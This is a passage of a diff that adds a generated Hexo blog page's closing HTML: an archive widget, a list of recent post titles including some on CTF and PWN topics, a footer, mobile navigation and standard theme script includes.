class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/12/05/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/02/15/2019-2-host-detect-by-port/">主机发现方案</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/10/linux-filesystem-learn1-md/">Linux文件系统学习1</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/19/2018-8-pwn-basic-knowlegeds/">PWN基础知识总结</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/16/2018-8-wp1/">hackme.inndy.tw toooomuch2 writeup</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
